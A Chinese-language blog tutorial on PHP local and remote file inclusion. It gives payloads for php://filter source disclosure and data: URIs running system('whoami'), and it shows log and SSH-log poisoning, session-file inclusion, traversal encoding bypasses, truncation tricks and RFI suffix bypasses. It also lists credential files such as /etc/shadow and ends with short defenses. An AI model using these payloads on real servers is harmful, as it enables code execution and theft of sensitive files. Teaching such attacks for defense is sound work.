<!DOCTYPE html>
<html lang="zh-CN">










<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" href="/favicon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="description" content="">
    <meta name="author" content="chuddy">
    <meta name="keywords" content="">
    <title>文件包含漏洞 ~ chuddy&#39;s Blog</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.7.2/css/all.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/mdb.min.css">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_vr10bjtg3us.css">
    
        <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
    
</head>

<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
<div class="container">
    <a class="navbar-brand" href="/"><strong>chuddy&#39;s Blog</strong></a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
        <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav ml-auto text-center">
            
            <li class="nav-item">
                <a class="nav-link" href="/">Home</a>
            </li>
            
            <li class="nav-item">
                <a class="nav-link" href="/archives/">Archives</a>
            </li>
            
        </ul>
    </div>
</div>


</nav>
    <div class="view intro-2" style='background: url("/post.jpg")no-repeat center center;background-size: cover;'>
    <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
        <div class="container text-center white-text wow fadeInUp">
            <p class="h2">文件包含漏洞</p>
            <br>
            
            <p>Wednesday, June 12th 2019, 12:03 pm</p>
            
        </div>
        </div>
    </div>
    </div>
  </header>

  <main>
  
  <div class="container-fluid">
    <div class="row">
        <div class="col-md-8 offset-md-2 ">
            <div class="post-content py-5 z-depth-3 main">
                <h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><a id="more"></a>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>文件包含这个漏洞，简单来说既是程序猿在开发中为了方便，会将在多个页面重复使用的代码单独写到一个文件中，在需要用到的地方直接包含进来，包含后的文件既相当于将被包含的整个文件内容复制到了包含处。因为在开发中是经常用到的，因此成为了攻击者的目标，便衍生了多种文件包含的攻击。</p>
<h2 id="在php中文件包含函数"><a href="#在php中文件包含函数" class="headerlink" title="在php中文件包含函数"></a>在php中文件包含函数</h2><pre><code>in&#39;lude()
include_once()
require()
require_once()
filel_get_contents()
fopen()
readfile()
</code></pre><p>区别：</p>
<ul>
<li>include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行</li>
<li>require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行</li>
</ul>
<p><code>require</code>一般是用于文件头包含类文件、数据库等等文件,<code>include</code>一般是用于包含<code>htm</code>l模版文件<br><code>include_once()</code>、<code>require_once()</code>与(include\require)的功能相同,只是区别于当重复调用的时候，它只会调用一次。</p>
<p>在php中文件包含分为本地文件包含（LFI）和远程文件包含（RFI）</p>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI(Local File Inclusion)"></a>LFI(Local File Inclusion)</h3><p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。</p>
<h3 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI(Remote File Inclusion)"></a>RFI(Remote File Inclusion)</h3><p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。</p>
<p>但RFI的利用条件较为苛刻，需要php.ini中进行配置</p>
<pre><code>    allow_url_fopen = On
    allow_url_include = On

</code></pre><p>两个配置选项均需要为<code>On</code>，才能远程包含文件成功。</p>
<p>但是，在<code>php.ini</code>中，<code>allow_url_fopen</code>默认一直是<code>On</code>，而<code>allow_url_include</code>从<code>php5.2</code>之后就默认为<code>Off</code>。</p>
<p>所以远程文件包含的利用条件比较苛刻.</p>
<h2 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h2><p>顾名思义，所要包含的文件是在服务器本身的文件</p>
<h3 id="包含姿势"><a href="#包含姿势" class="headerlink" title="包含姿势"></a>包含姿势</h3><h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h4><h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p>利用条件：</p>
<ul>
<li><code>allow_url_include</code> = On。</li>
<li>对<code>allow_url_fopen</code>不做要求。</li>
</ul>
<p>姿势：</p>
<p><img src="https://s2.ax1x.com/2019/06/12/VRKypd.png" alt="image"></p>
<h5 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h5><p>利用它可以读取服务器中的文件</p>
<p>由于读取文件的数据直接输出在了页面上，如果读取的是php文件的话，浏览器会直接解析成php代码而不会显示，那么我们可以用这个协议将php文件中的代码以base64的形式输出在页面上：</p>
<p>payload:</p>
<pre><code>index.php?file=php://filter/read=convert.base64-encode/resource=index.php
</code></pre><p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。</p>
<p>其他姿势：</p>
<pre><code>file.php?file=php://filter/convert.base64-encode/resource=index.php
</code></pre><p>效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。</p>
<h5 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h5><p>利用条件：</p>
<ul>
<li>php版本大于等于php5.3.0</li>
</ul>
<p>假设有个文件<code>phpinfo.php</code>，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包<code>phpinfo.zip</code></p>
<p>利用：</p>
<p>指定绝对路径：</p>
<pre><code>file.php?file=phar://D:/phpStudy/WWW/phpinfo.zip/phpinfo.php
</code></pre><p>也可以使用相对路径：</p>
<pre><code>file.php?file=phar://phpinfo.zip/phpinfo.php
</code></pre><p>都可以成功发包含文件。</p>
<p><img src="https://s2.ax1x.com/2019/06/12/VRlIhD.png" alt="image"></p>
<h5 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h5><p>利用条件：</p>
<ul>
<li>php版本大于等于php5.3.0</li>
</ul>
<p>姿势：</p>
<p>构造zip包的方法和phar相同。<br><br>但是使用zip伪协议，需要指定绝对路径，同时将<code>#</code>编码为<code>%23</code>,之后填上压缩包内的文件·。</p>
<pre><code>file.php?file=zip://D:/phpStudy/WWW/phpinfo.zip%23phpinfo.php
</code></pre><p>若是使用相对路径，则会包含失败。</p>
<h5 id="data：URI-schema"><a href="#data：URI-schema" class="headerlink" title="data：URI schema"></a>data：URI schema</h5><p>利用条件：</p>
<ul>
<li>php版本大于等于php5.2</li>
<li><code>allow_url_fopen</code> = On</li>
<li><code>allow_url_include</code> = On</li>
</ul>
<p>姿势一：</p>
<pre><code>?file=data:text/plain,&lt;?php phpinfo();?&gt;
</code></pre><p><img src="https://s2.ax1x.com/2019/06/12/VRGGEq.png" alt="image"></p>
<p>也可以执行命令：</p>
<pre><code>?file=data:text/plain,&lt;?php system(&#39;whoami&#39;);?&gt;
</code></pre><p>姿势二：</p>
<pre><code>?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
</code></pre><p>加号<code>+</code>的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8+</code>的base64解码为：<code>&lt;?php phpinfo();?&gt;</code></p>
<p>也可以执行命令：</p>
<pre><code>?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==
</code></pre><p><code>PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</code>的base64解码为：<code>&lt;?php system(&#39;whoami&#39;);?&gt;</code></p>
<h4 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h4><p>利用条件：</p>
<pre><code>session文件路径已知，且其中内容部分可控。
</code></pre><p>姿势：</p>
<p>php的<code>session</code>文件的保存路径可以在<code>phpinfo</code>的<code>session.save_path</code>看到。</p>
<p><img src="https://s2.ax1x.com/2019/06/12/VW9nxg.png" alt="image"></p>
<p>常见的php-session存放位置：</p>
<pre><code> /var/lib/php/sess_PHPSESSID
 /var/lib/php/sess_PHPSESSID
 /tmp/sess_PHPSESSID
 /tmp/sessions/sess_PHPSESSID
</code></pre><p>其中，session文件的格式时固定的：<code>sess_[phpsessid]</code>.而<code>phpsessid</code>在发送的请求的<code>cookie</code>字段中可以看到。</p>
<p>测试代码：</p>
<pre><code>&lt;?php 
    session_start();
    $_SESSION[&#39;chuddy&#39;]=$_GET[&#39;file&#39;];
    @include($_GET[&#39;file&#39;]);
?&gt;
</code></pre><p>先随便尝试访问一下，存储一个session文件，我们打开访问：<code>http://192.168.1.153/session.php?file=chuddy</code> 查看这个session文件的内容为：<code>chuddy|s:6:&quot;chuddy&quot;;#</code>发现存储了<code>file</code>值。于是尝试包含session文件。</p>
<p>抓包访问：<br><img src="https://s2.ax1x.com/2019/06/12/VWC01S.png" alt="image"><br>记住这个<code>PHPSESSID=asudiplcmv80km7fb5klokpki0</code>,于是得到session文件名为：<code>sess_asudiplcmv80km7fb5klokpki0</code>，所以session文件的路径为<code>/var/lib/php/session/sess_asudiplcmv80km7fb5klokpki0</code></p>
<p><img src="https://s2.ax1x.com/2019/06/12/VWCvcD.png" alt="image"></p>
<p>可以成功包含！</p>
<h4 id="本地日志等文件的包含"><a href="#本地日志等文件的包含" class="headerlink" title="本地日志等文件的包含"></a>本地日志等文件的包含</h4><p>顾名思义，所要包含的文件是在服务器本身的文件，我们可以读取一些在服务器上特殊的敏感信息</p>
<p>上网搜了一下敏感文件的位置：</p>
<p>windows:</p>
<pre><code>c:\boot.ini                                                                      // 查看系统版本

c:\windows\system32\inetsrv\MetaBase.xml                                         //  IIS配置文件

c:\windows\repair\sam                                                            //  存储Windows系统初次安装的密码

c:\Program Files\mysql\my,ini                                                    //   MySQL配置

c:\Program Files\mysql\data\mysql\user.MYD                                       //   MySQL root

c:\windows\php.ini                                                               //   php 配置信息

c:\windows\my.ini                                                                //   MySQL 配置文件

</code></pre><p>linux:</p>
<pre><code>/etc/passwd                                                                      //  账户信息

/etc/shadow                                                                      //  账户密码文件

/usr/local/app/apache2/conf/httpd.conf                                           //   Apache2默认配置文件

/usr/local/app/apache2/conf/extra/httpd-vhost.conf                                //   虚拟网站配置

/usr/local/app/php5/lib/php.ini                                                  //   PHP相关配置

/etc/httpd/conf/httpd.conf                                                       //   Apache配置文件

/etc/my.conf                                                                     //   mysql 配置文件
</code></pre><h5 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h5><p>利用条件：</p>
<pre><code>需要知道服务器日志的存储路径，且日志文件可读。
</code></pre><p>很多时候，web服务器会将请求写入到日志文件中，比如说<code>apache</code>。在用户发起请求时，会将请求写入<code>access.log</code>，当发生错误时将错误写入<code>error.log</code>。默认情况下，每个系统日志文件的存储位置不一样，<code>centos</code>日志保存路径在 <code>/var/log/httpd/access.log</code> , <code>ubantu</code>日志文件会保存在<code>/var/log/apache2/access.log</code>。</p>
<p>在本地常看日志会记录，一些什么信息。</p>
<pre><code>192.168.1.115 - - [12/Jun/2019:15:19:23 +0800] &quot;GET /file.php HTTP/1.1&quot; 200 166&quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0&quot;
</code></pre><p>通过对正常日志文件的分析发现，里面会存储我们访问的<code>ip信息</code>，请求的时间，请求求方式，url，客户端浏览器的信息等。</p>
<p>我们把shell藏在url里面</p>
<pre><code>http://192.168.1.103/file.php?file=&lt;?php phpinfo();?&gt;
</code></pre><p>但是我们包含失败了，我们查看日志信息：</p>
<pre><code>192.168.1.115 - - [13/Jun/2019:16:25:01 +0800] &quot;GET /file.php?file=%3C?php%20phpinfo();?%3E HTTP/1.1&quot; 200 203 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0&quot;

</code></pre><p>发现一些特殊符号被编码使得无法正确解析。在<code>access.log</code>中还包括了用户访问的浏览器信息，也就是<code>head</code>头部中的<code>User-Agent</code>标识，如果我们把php代码插入到这里，那么同样也是可以执行的，先用burp抓一个包，插入php代码</p>
<p><img src="https://s2.ax1x.com/2019/06/12/VWpXUx.md.png" alt="VWpXUx.md.png"></p>
<p>然后查看日志文件：</p>
<pre><code>192.168.1.115 - - [13/Jun/2019:04:02:42 +0800] &quot;GET /file.php?file=chuddy.php HTTP/1.1&quot; 200 - &quot;-&quot; &quot;&lt;?php phpinfo();?&gt;&quot;
</code></pre><p>发现php代码已经写在上面了。尝试包含即可</p>
<h5 id="SSH日志包含"><a href="#SSH日志包含" class="headerlink" title="SSH日志包含"></a>SSH日志包含</h5><p>利用条件：需要知道ssh-log的位置，且可读。</p>
<p>linux下ssh日志的位置：</p>
<pre><code>
/var/log/secure
/var/log/auth.log
/var/log/messages

Mac OS X(v10.4 or greater):
    /private/var/log/asl.log

Mac OS X(v10.3 or earlier)
    /private/var/log/system.log

Debian
    /var/log/auth.log
</code></pre><p>centos的ssh日志路径为：<code>/var/log/secure</code></p>
<p>我们尝试ssh连接<code>ssh &#39;&lt;?php phpinfo(); ?&gt;&#39;@192.168.1.153</code></p>
<p>发现能在日志文件中成功写下<code>&lt;?php phpinfo(); ?&gt;</code>：</p>
<pre><code>Jun 13 04:37:43 localhost sshd[1829]: Invalid user &lt;?php phpinfo(); ?&gt; from 192.168.1.115
Jun 13 04:37:43 localhost sshd[1830]: input_userauth_request: invalid user &lt;?php phpinfo(); ?&gt;
Jun 13 04:37:45 localhost sshd[1830]: Connection closed by 192.168.1.115
</code></pre><p><img src="https://s2.ax1x.com/2019/06/12/VWFDXD.png" alt="image"></p>
<p>第一次尝试发现不能包含，查看之后，发现没有权限，赋给它权限之后才能成功包含。</p>
<h4 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h4><p>php文件上传文件时，会创建临时文件。在linux下使用的是<code>/tmp</code>目录，而在windows下使用<code>c:\winsdows\temp</code>,在临时文件被删除之前，利用条件竞争可以包含该临时文件。这个和文件上传漏洞联系比较紧密。</p>
<h4 id="加了一些限制的绕过方法"><a href="#加了一些限制的绕过方法" class="headerlink" title="加了一些限制的绕过方法"></a>加了一些限制的绕过方法</h4><p>在大多数的情况下，我们碰到的不会是简简单单的<code>include $_GET[&#39;file&#39;];</code>这样直接把变量传入包含函数内的，在很多时候包含的变量/文件，会被值订前缀和后缀。</p>
<h5 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h5><p>测试代码：</p>
<pre><code>&lt;?php
    $file = @$_GET[&#39;file&#39;];
    include &#39;/var/www/html/&#39;.$file;
?&gt;
</code></pre><p>而在根目录下有一个flag文件内容为：<code>&lt;?php phpinfo();?&gt;</code></p>
<h5 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h5><p>利用<code>../</code>可以进行目录遍历，比如我们尝试访问：</p>
<pre><code>include.php?file=../../../flag
</code></pre><p>则服务器端实际拼接出来的路径为：<code>/var/www/html/../../../flag</code>，也即<code>/flag</code>。从而包含成功。</p>
<p><img src="https://s2.ax1x.com/2019/06/13/VhEfcq.png" alt="image"></p>
<p>但是有时候会对<code>../</code>做一些过滤，我们可以利用一些编码来进行绕过。</p>
<ul>
<li>利用url编码<ul>
<li>../<ul>
<li>%2e%2e%2f</li>
<li>..%2f</li>
<li>%2e%2e/</li>
</ul>
</li>
<li>..\<ul>
<li>%2e%2e%5c</li>
<li>..%5c</li>
<li>%2e%2e\</li>
</ul>
</li>
</ul>
</li>
<li>二次编码<ul>
<li>../<ul>
<li>%252e%252e%252f</li>
</ul>
</li>
<li>..\<ul>
<li>%252e%252e%255c</li>
</ul>
</li>
</ul>
</li>
<li>容器/服务器的编码方式<ul>
<li>../<ul>
<li>..%c0%af</li>
<li>%c0%ae%c0%ae/<ul>
<li>注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）</li>
<li>Apache Tomcat Directory Traversal</li>
</ul>
</li>
</ul>
</li>
<li>..\<ul>
<li>..%c1%9c</li>
</ul>
</li>
</ul>
</li>
</ul>
<h6 id="指定后缀名"><a href="#指定后缀名" class="headerlink" title="指定后缀名"></a>指定后缀名</h6><p>当包含的文件指定了后缀名时：</p>
<pre><code class="php">&lt;?php 
@include($_GET[&#39;file&#39;].&quot;.html&quot;);
?&gt;
</code></pre>
<p>可以尝试利用以下方法绕过。</p>
<h6 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h6><p>利用条件：</p>
<pre><code>需要修改php.ini的配置： 
    magic_quotes_gpc=off
PHP小于5.3.4
</code></pre><p>例如上面例题代码一样：限制只能包含<code>html</code>文件。假如有一个<code>phpinfo.php</code>内容时<code>&lt;?php phpinfo(); ?&gt;</code>，直接包含时肯定不行的，文件名会变成<code>phpinfo.php.html</code>如果在参数后面加上一个<code>%00</code>，实现<code>%00</code>截断发现成功包含。</p>
<p><img src="https://s2.ax1x.com/2019/06/12/VRqz8A.png" alt="image"></p>
<h6 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h6><p>在windows最大长度是256，linux上是4096</p>
<p>payload:</p>
<pre><code>?file=phpinfo.php/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././
</code></pre><p><img src="https://s2.ax1x.com/2019/06/12/VRLWsP.png" alt="image"></p>
<h6 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h6><p>适用于windows下，<code>.</code>要超过256</p>
<p>payload：</p>
<pre><code>?file=phpinfo.php..................................................................................................................................................................................................................................................................
</code></pre><p><img src="https://s2.ax1x.com/2019/06/12/VRL5dS.png" alt="image"></p>
<h2 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h2><p>利用条件：</p>
<pre><code>allow_url_fopen = On
allow_url_include = On
</code></pre><p>测试代码：</p>
<pre><code>&lt;?php
    $file = @$_GET[&#39;file&#39;];
    @include($file);
?&gt;
</code></pre><p>在远程服务器上的文件代码(test.txt)</p>
<pre><code>&lt;?php
phpinfo();
?&gt;
</code></pre><p>payload:</p>
<pre><code>http://127.0.0.1/file.php?file=http://192.168.1.103/test.txt
</code></pre><p><img src="https://s2.ax1x.com/2019/06/13/VhnGYF.png" alt="image"></p>
<h3 id="有限制远程文件包含漏洞绕过"><a href="#有限制远程文件包含漏洞绕过" class="headerlink" title="有限制远程文件包含漏洞绕过"></a>有限制远程文件包含漏洞绕过</h3><p>测试代码</p>
<pre><code>&lt;?php
    $file = @$_GET[&#39;file&#39;];
    @include($file.&quot;.html&quot;);
?&gt;
</code></pre><p>我们发现这里的后缀名被限制为<code>.html</code>。</p>
<h4 id="url"><a href="#url" class="headerlink" title="url"></a>url</h4><p>url格式：</p>
<pre><code>protocol :// hostname[:port] / path / [;parameters][?query]#fragment

</code></pre><p>在远程文件包含漏洞中，可以利用query或fragment来绕过后缀限制。</p>
<p>姿势一:query（?）</p>
<pre><code>http://127.0.0.1/file1.php?file=http://192.168.1.103/test.txt?
</code></pre><p>则包含的文件为 <code>http://127.0.0.1/file1.php?file=http://192.168.1.103/test.txt?.html</code><br>问号后面的部分<code>.html</code>，也就是指定的后缀被当作<code>query</code>从而被绕过。</p>
<p><img src="https://s2.ax1x.com/2019/06/13/Vh8Sbj.png" alt="image"></p>
<p>姿势二：fragment（#）</p>
<pre><code>http://127.0.0.1/file1.php?file=http://192.168.1.103/test.txt%23
</code></pre><p>则包含的文件为<br>问号后面的部分<code>.html</code>，也就是指定的后缀被当作<code>fragment</code>从而被绕过。注意需要把<code>#</code>进行url编码为<code>%23</code>。</p>
<p><img src="https://s2.ax1x.com/2019/06/13/Vh8A2T.png" alt="image"></p>
<h4 id="windows和linux差别"><a href="#windows和linux差别" class="headerlink" title="windows和linux差别"></a>windows和linux差别</h4><p>在windows上<code>%00</code>、<code>%3f</code>可以绕过，在linux除此之外<code>%20</code>也可以绕过</p>
<h3 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h3><ul>
<li>在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败</li>
<li>做好文件的权限管理</li>
<li>php中可以使用open_basedir配置限制访问限制在指定的区域</li>
<li>过滤<code>.</code>、<code>\</code>、<code>/</code>等</li>
<li>禁止服务器远程文件包含</li>
</ul>

                <hr>
                <div>
                    <p>
                         
                        <span class="badge badge-light">#&nbsp;web常见漏洞</span>
                        &nbsp;
                        
                    </p>
                </div>
                <br>
                
            </div>
        </div>
        <div class="d-none d-md-block col-md-2">
            
  <div id="toc" class="py-5">
    <p class="h6"><i class="iconfont icon-toc" style="vertical-align:middle"></i> Toc:</p> 
    <div id="tocbot"></div>
  </div>

        </div>
    </div>        
</div>

<br><br><br>

<!-- Comments -->
<div class="comments" id="comments">
 
</div>
  
  </main>

<footer class="mt-5">
  <div class="text-center py-3">
    <a href="https://hexo.io" target="_blank"><b>HEXO</b></a>
    <i class="iconfont icon-love"></i>
    <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
  </div>
</footer>

  <!-- SCRIPTS -->
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/jquery-3.3.1.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/popper.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/bootstrap.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/mdb.min.js"></script>
  <script src="/js/main.js"></script>
  
    
      <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    
    <script src="/js/post.js"></script>
    
      <script src="/js/plugins/prettify.js"></script>
      <script>
          $(document).ready(function(){
              $('pre').addClass('prettyprint linenums');
              prettyPrint();
          })
      </script>
    
  
</body>
</html>